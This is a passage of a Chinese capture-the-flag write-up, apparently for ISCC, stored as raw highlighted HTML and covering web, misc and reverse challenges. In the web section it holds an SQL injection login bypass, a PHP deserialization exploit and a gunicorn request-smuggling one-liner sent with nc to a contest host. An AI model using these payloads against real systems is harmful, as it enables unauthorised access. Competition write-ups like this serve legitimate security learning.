keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user not exist or wrong passwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>发现是页面源码，简单代码审计就行：<br/> payload:<code>username=0' union select 1,0x61646d696e,3#&amp;passwd=3 </code>(POST)</p>\n<h2><a id=\"Find_me_180\"></a>Find me</h2>\n<p>(赛博朋克是吧（恼<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/1b3c2465a9b12ddaed5f96da4cf5a0d5.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=415&amp;id=u6cb18ca6&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=515&amp;originWidth=819&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=48043&amp;status=done&amp;style=none&amp;taskId=u255e73af-93b0-4873-9501-247e9ded241&amp;title=&amp;width=660.7058611731694)<br/> 查看源码，php代码审计——反序列化<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/14867ec821179a7f9ef912c60882cbc4.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=694&amp;id=u51284a1f&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=860&amp;originWidth=705&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=21607&amp;status=done&amp;style=none&amp;taskId=uf3de7a3f-e4dc-4068-a122-8c84bf126ea&amp;title=&amp;width=568.7394775666477)<br/> exp:</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">a</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$un0</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"DirectoryIterator\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$un1</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"glob:///var/www/html/f*.txt\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$un2</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$un3</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"unserialize\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$un4</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"niu\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h2><a id=\"_199\"></a>让我康康！！</h2>\n<p>gunicorn走私漏洞<br/> exp:<br/> <code>echo -en \"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\" | nc 59.110.159.206 7020 </code><br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/cbcb41614e42eba5a3ae911972b644a7.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=645&amp;id=ucabb03f0&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=800&amp;originWidth=639&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=196971&amp;status=done&amp;style=none&amp;taskId=u6a5fadc1-3d17-4dda-924a-57fcfe787b3&amp;title=&amp;width=515.4957817944509)</p>\n<h1><a id=\"MISC_204\"></a>MISC</h1>\n<h2><a id=\"2022_205\"></a>2022冬奥会</h2>\n<p>![image.png](https://img-blog.csdnimg.cn/img_convert/37a7bf05fde16ce96706397d922badb9.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=433&amp;id=u666c52ea&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=537&amp;originWidth=1241&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=36271&amp;status=done&amp;style=none&amp;taskId=u58f76f0a-351a-45a4-80bc-f547fbfc3ee&amp;title=&amp;width=1001.1428250499429)<br/> 百度：灯笼（</p>\n<h2><a id=\"_208\"></a>单板小将苏翊鸣</h2>\n<p>改图片高度，得到二维码扫码得到Unicode编码，转换得：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/931db4544f5078bc74c0a7c7ea40cbf9.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=365&amp;id=uea4ad68d&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=452&amp;originWidth=971&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=38566&amp;status=done&amp;style=none&amp;taskId=u692e43d5-2272-4d6d-b7f7-e604e914399&amp;title=&amp;width=783.327705981865)<br/> 密码:15 9 4 2</p>\n<h2><a id=\"_212\"></a>降维打击</h2>\n<p>屑魔女(<br/> 这个题出自《魔女之旅》，png图片是屑魔女伊蕾娜<br/> 使用<code>foremost</code>提取 ，zsteg分离：<br/> ![S358F84BOM%4JY8~AS@QLS3.png](https://img-blog.csdnimg.cn/img_convert/f024909e373807427bb915d306d2deef.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=277&amp;id=u40449504&amp;margin=[object Object]&amp;name=S358F84BOM%4JY8~AS@QLS3.png&amp;originHeight=343&amp;originWidth=813&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17916&amp;status=done&amp;style=none&amp;taskId=ube264a05-724c-462a-b389-b8bf2c287e9&amp;title=&amp;width=655.8655251938787)<br/> ![](https://img-blog.csdnimg.cn/img_convert/4f4c6cabe3a32ad9c29384aedde3e24c.webp?x-oss-process=image/format,png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uc2f18b67&amp;margin=[object Object]&amp;originHeight=500&amp;originWidth=942&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=uf60a1f73-8fa3-4be2-a9e6-cec6ee74972&amp;title=)<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/0a92af67f3aa9ece5eca6af7d746212e.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=481&amp;id=u08ea6a40&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=596&amp;originWidth=1082&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=287638&amp;status=done&amp;style=none&amp;taskId=u24a5383a-b381-4c21-8c2b-82f273f2cc0&amp;title=&amp;width=872.8739215987415)<br/> 知乎和B站在很早之前就有大佬做过对照表了，嫖就可以了（）<br/> （tips：之前知乎那个答案找不到了，今天写wp的时候就去B站找对照表了，然后看到有趣的一幕：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/0a153048b484c6f5258cc56ee30b4f75.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=290&amp;id=u08644164&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=360&amp;originWidth=611&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=43308&amp;status=done&amp;style=none&amp;taskId=ua45357a9-f65a-4acd-9e03-1a1ef3f2ad9&amp;title=&amp;width=492.90754722442796)<br/> 我也留个言= =：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/fd04e482c6501c1ab1aebfdfcb22801c.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=487&amp;id=ubaf3b563&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=604&amp;originWidth=1070&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=92425&amp;status=done&amp;style=none&amp;taskId=u00780d8a-a12c-44c7-9aa4-6ab825cc119&amp;title=&amp;width=863.1932496401603)</p>\n<h2><a id=\"1_224\"></a>藏在星空中的诗-1</h2>\n<p>ps分离 stars.psd 图层 拿到一个星图,想想五角星怎么一笔画（<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/98d90a983d4c394036ee72bc5b640438.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=631&amp;id=u792e40ee&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=782&amp;originWidth=920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1200314&amp;status=done&amp;style=none&amp;taskId=u18b0db14-96b4-4693-ba58-f103079f9fb&amp;title=&amp;width=742.1848501578949)<br/> 把1 3 5 2 4行的星星连一起就是压缩包密码了（注意使用WINRAR，不然可能会存在无法解析的字符）<br/> 当然啊，你也可以暴力破解（：<br/> 然后就可以拿到Key了：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/e4c1a11bda8c39d08e28d64adc94c010.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=571&amp;id=u0b6e647a&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=708&amp;originWidth=262&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26149&amp;status=done&amp;style=none&amp;taskId=u92e98821-0106-45f0-88eb-6b0f5ffea9f&amp;title=&amp;width=211.361337762357)</p>\n<h2><a id=\"2_231\"></a>藏在星空中的诗-2</h2>\n<p>![UO6}BM<code>(~SAG1W0)71HB0BD.png](https://img-blog.csdnimg.cn/img_convert/5b39f9bdd25d852f3b058afa431d0601.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=645&amp;id=ua8e7fb07&amp;margin=[object Object]&amp;name=UO6}BM</code>(~SAG1W0)71HB0BD.png&amp;originHeight=799&amp;originWidth=793&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=52436&amp;status=done&amp;style=none&amp;taskId=u0e3c71e4-6489-4fbf-86c9-b57a93cf3a3&amp;title=&amp;width=639.7310719295767)<br/> 由于比赛的flag的前5个字符是 ISCC{ ，对于附件形式：<br/> \\🌟🌠🌠 == \\u00<br/> 然后，后面两个的字母对应的换成u+xxxxx的最后一个数字<br/> 这样还是比较容易找到规律的（虽然其实有点开脑洞<br/> 对照题1的Key，可以手动替换，也可以用py脚本（）</p>\n<h2><a id=\"_238\"></a>套中套</h2>\n<p>png+压缩包，经典组合（<br/> 首先图片：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/2abf8ed15516470f281afc3b6331a87c.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=95&amp;id=u91bbb396&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=118&amp;originWidth=992&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=104151&amp;status=done&amp;style=none&amp;taskId=u924cc96f-19aa-412b-9225-f6d12d62c44&amp;title=&amp;width=800.2688819093822)然后改高度：<br/> ![9)7O07JFNILW3H4Z0D)4)XV.png](https://img-blog.csdnimg.cn/img_convert/f11f1b02a31771baa98e5cfcebef01f2.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=590&amp;id=uacc243a0&amp;margin=[object Object]&amp;name=9)7O07JFNILW3H4Z0D)4)XV.png&amp;originHeight=731&amp;originWidth=820&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=212320&amp;status=done&amp;style=none&amp;taskId=uded87133-f6e4-48a0-9418-2a2df864dca&amp;title=&amp;width=661.5125838363845)<br/> 密码：wELC0m3_T0_tH3_ISCC_Zo2z<br/> 打开压缩包，简单分析之后发现是RSA加密<br/> <code>exp:</code></p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nciphertext <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'enc.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npriv <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'priv.Key'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npub <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pub.Key'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'r.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nrinv <span class=\"token operator\">=</span> invmod<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\n\ncc <span class=\"token operator\">=</span> ciphertext <span class=\"token operator\">*</span> rinv <span class=\"token operator\">%</span> q\nmsgbit <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> coeff <span class=\"token keyword\">in</span> priv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> cc <span class=\"token operator\">//</span> coeff <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        msgbit <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        msgbit <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span>\n    cc <span class=\"token operator\">%=</span> coeff\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>msgbit<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h2><a id=\"_267\"></a>隐秘的信息</h2>\n<p>ZWFzeV90b19maW5kX3RoZV9mbGFn<br/> ——&gt;&gt; <code>easy_to_find_the_flag</code><br/> 密码打开：是png，分析一波<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/ced3f3a250afd1cc4b44a59ad5fc1b34.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=39&amp;id=ue3070499&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=48&amp;originWidth=87&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1296&amp;status=done&amp;style=none&amp;taskId=ue3899090-db14-41bd-9b0d-192e0ed2b04&amp;title=&amp;width=70.18487169971397)<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/31a9fa5db370ebf3d0367097fb5b081d.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=44&amp;id=u0f50299d&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=54&amp;originWidth=101&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1555&amp;status=done&amp;style=none&amp;taskId=ud45618c1-0dc6-4948-b71d-8f1c6e3ea72&amp;title=&amp;width=81.4789889847254)<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/b0171e95c57187e1a0dc1e0fa7d5b906.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=44&amp;id=u827405bc&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=55&amp;originWidth=87&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=1346&amp;status=done&amp;style=none&amp;taskId=u64a8c462-6a5b-4c50-8252-a8ed8413875&amp;title=&amp;width=70.18487169971397)<br/> 发现三个的0通道不一样，判定是LSB隐写：</p>\n<pre><code>fff495343437b6b5 4336a74507377355  ...447.. C6.E.7sU\n23759365270796a4 e7a307dc01f8007f  #u.e'... ........\nfffc7e3fe00fff00 71ffffffffffffff  ..~?.... q.......\nffffffffffffffff ffffffffffffffff  ........ ........\n</code></pre>\n<p>删掉干扰信息：fff 以及 71之后的f</p>\n<pre><code>495343437b6b5 4336a74507377355  \n23759365270796a4 e7a307dc01f8007f  \nfffc7e3fe00fff00 71\n</code></pre>\n<p>hex转字符就出了（</p>\n<h1><a id=\"imagepnghttpsimgblogcsdnimgcnimg_convert6c1fa3435c2aeac0b751f1b04b0ae7afpngclientIdu8fc2d141c0944crop0crop0crop1crop1frompasteheight454idudc4f0010marginobject_ObjectnameimagepngoriginHeight563originWidth1076originalTypebinaryratio1rotation0showTitlefalsesize22674statusdonestylenonetaskIdu2b08080b173c4c03ae0322db2be1e9btitlewidth8680335856194508_288\"></a>![image.png](https://img-blog.csdnimg.cn/img_convert/6c1fa3435c2aeac0b751f1b04b0ae7af.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=454&amp;id=udc4f0010&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=563&amp;originWidth=1076&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22674&amp;status=done&amp;style=none&amp;taskId=u2b08080b-173c-4c03-ae03-22db2be1e9b&amp;title=&amp;width=868.0335856194508)</h1>\n<h1><a id=\"REVERSE_289\"></a>REVERSE</h1>\n<h2><a id=\"GetTheTable_290\"></a>GetTheTable</h2>\n<p>Base 58(</p>\n<h2><a id=\"Amys_Code_292\"></a>Amy’s Code</h2>\n<p>IDEA x32_生成C文件：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/696025a38b9819cf8752974ac136ab38.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=507&amp;id=u32a6691e&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=628&amp;originWidth=469&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=34148&amp;status=done&amp;style=none&amp;taskId=u6fa7c783-5aa2-4186-be57-ba319c0130f&amp;title=&amp;width=378.3529290478833)<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/64db2003d9f8feb7612ee0d94564f284.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=720&amp;id=uc6ce813e&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=893&amp;originWidth=1069&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=70863&amp;status=done&amp;style=none&amp;taskId=u33319f10-d5d2-4165-984e-82c689c0fee&amp;title=&amp;width=862.3865269769451)</p>\n<h2><a id=\"How_decode_296\"></a>How_decode</h2>\n<p>IDA：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/f1cb19317901b05702a6b2c889aeef7f.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=406&amp;id=u958c0c21&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=503&amp;originWidth=293&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22491&amp;status=done&amp;style=none&amp;taskId=u3708c208-cd93-416a-a988-e3b5fd525c7&amp;title=&amp;width=236.3697403220252)<br/> EXP：</p>\n<pre><code class=\"prism language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;bits/stdc++.h&gt;</span></span>\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n string flag <span class=\"token operator\">=</span> <span class=\"token string\">\"ISCC{012345678901}\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">int</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token char\">'I'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'S'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'C'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'C'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">int</span> rounds <span class=\"token operator\">=</span> <span class=\"token number\">52</span> <span class=\"token operator\">/</span> n <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> \n <span class=\"token keyword\">int</span> static1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> \n <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> flagI<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">2107429600</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2127402263</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">812658708</span><span class=\"token punctuation\">,</span><span class=\"token number\">2013727646</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2124073059</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">344045391</span><span class=\"token punctuation\">,</span><span class=\"token number\">61124428</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">483779417</span><span class=\"token punctuation\">,</span><span class=\"token number\">734300904</span><span class=\"token punctuation\">,</span><span class=\"token number\">539540243</span><span class=\"token punctuation\">,</span><span class=\"token number\">82870802</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">526018275</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">170745234</span><span class=\"token punctuation\">,</span><span class=\"token number\">1669825930</span><span class=\"token punctuation\">,</span><span class=\"token number\">452740702</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">108762530</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">97994846</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1210532932</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n rounds <span class=\"token operator\">=</span> <span class=\"token number\">52</span> <span class=\"token operator\">/</span> n <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> \n static1 <span class=\"token operator\">=</span> rounds <span class=\"token operator\">*</span> <span class=\"token operator\">-</span><span class=\"token number\">0x61C88647</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> flagI<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> rounds<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n <span class=\"token keyword\">int</span> static2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>static1 <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> \n <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&gt;=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n <span class=\"token keyword\">int</span> z <span class=\"token operator\">=</span> flagI<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n flagI<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>y <span class=\"token operator\">^</span> static1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>z <span class=\"token operator\">^</span> key<span class=\"token punctuation\">[</span>static2 <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>z <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>y <span class=\"token operator\">&gt;&gt;</span> <span 